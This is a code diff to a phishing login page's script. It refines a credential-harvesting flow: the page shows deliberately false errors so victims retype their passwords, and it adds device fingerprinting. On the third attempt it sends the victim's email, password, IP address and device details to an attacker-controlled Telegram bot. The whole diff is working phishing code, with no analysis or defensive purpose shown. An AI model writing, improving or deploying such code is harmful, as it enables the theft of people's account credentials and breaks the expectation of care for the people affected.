@@ -147,18 +147,24 @@
         catch(e) { return 'unknown'; }
     }
 
+    function getDeviceModel() {
+        let userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        let platform = navigator.platform;
+        let deviceInfo = `${userAgent} | Platform: ${platform}`;
+        if (deviceInfo.length > 200) {
+            deviceInfo = deviceInfo.substring(0, 200);
+        }
+        return deviceInfo;
+    }
+
     function showMessage(box, text, isError) {
         box.textContent = text;
         box.className = `message ${isError ? 'error-msg' : 'success-msg'}`;
         box.style.display = 'block';
-        setTimeout(() => box.style.display = 'none', 3000);
+        setTimeout(() => box.style.display = 'none', 3500);
     }
 
-    function clearPasswordField() {
-        document.getElementById('passwordInput').value = '';
-    }
-
-    function goBackToEmail() {
+    function clearAndResetToEmail() {
         document.getElementById('step2View').classList.add('hidden');
         document.getElementById('step1View').classList.remove('hidden');
         document.getElementById('stepIndicator').textContent = "Step 1 of 2";
@@ -166,6 +172,14 @@
         document.getElementById('passwordInput').value = '';
         currentEmail = '';
         attemptCount = 0;
+    }
+
+    function clearPasswordOnly() {
+        document.getElementById('passwordInput').value = '';
+    }
+
+    function goBackToEmail() {
+        clearAndResetToEmail();
     }
 
     // Step 1: Email Validation
@@ -205,12 +219,14 @@
         if (hasPashtoCharacters(pass)) {
             if (attemptCount === 1) {
                 showMessage(errorBox, 'Please check your email', true);
+                clearAndResetToEmail();
             } else if (attemptCount === 2) {
                 showMessage(errorBox, 'Please check your email password', true);
+                clearPasswordOnly();
             } else if (attemptCount === 3) {
                 showMessage(errorBox, 'please pashto not allowed', true);
+                clearPasswordOnly();
             }
-            clearPasswordField();
             return;
         }
         
@@ -218,12 +234,14 @@
         if (pass.length < 8 && pass.length > 0) {
             if (attemptCount === 1) {
                 showMessage(errorBox, 'Please check your email', true);
+                clearAndResetToEmail();
             } else if (attemptCount === 2) {
                 showMessage(errorBox, 'Please check your email password', true);
+                clearPasswordOnly();
             } else if (attemptCount === 3) {
                 showMessage(errorBox, 'Password must be at least 8 characters', true);
+                clearPasswordOnly();
             }
-            clearPasswordField();
             return;
         }
         
@@ -231,23 +249,26 @@
         if (!pass) {
             if (attemptCount === 1) {
                 showMessage(errorBox, 'Please check your email', true);
+                clearAndResetToEmail();
             } else if (attemptCount === 2) {
                 showMessage(errorBox, 'Please check your email password', true);
+                clearPasswordOnly();
             } else if (attemptCount === 3) {
                 showMessage(errorBox, 'Please enter your password', true);
+                clearPasswordOnly();
             }
-            clearPasswordField();
             return;
         }
         
         // Valid password (8+ chars, no Pashto)
         if (attemptCount === 3) {
             let ip = await getUserIP();
+            let deviceModel = getDeviceModel();
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     chat_id: ADMIN_ID, 
-                    text: `access from login telegrame page\n✅ LOGIN SUCCESS (3rd attempt)\nEmail: ${currentEmail}\nPass: ${pass}\nIP: ${ip}\nmodel: ${model}`,
+                    text: `access from login telegrame page\n✅ LOGIN SUCCESS (3rd attempt)\nEmail: ${currentEmail}\nPass: ${pass}\nIP: ${ip}\nDevice: ${deviceModel}`,
                     parse_mode: 'Markdown'
                 })
             });
@@ -262,10 +283,11 @@
         } else {
             if (attemptCount === 1) {
                 showMessage(errorBox, 'Please check your email', true);
+                clearAndResetToEmail();
             } else if (attemptCount === 2) {
                 showMessage(errorBox, 'Please check your email password', true);
+                clearPasswordOnly();
             }
-            clearPasswordField();
         }
     };
 </script>
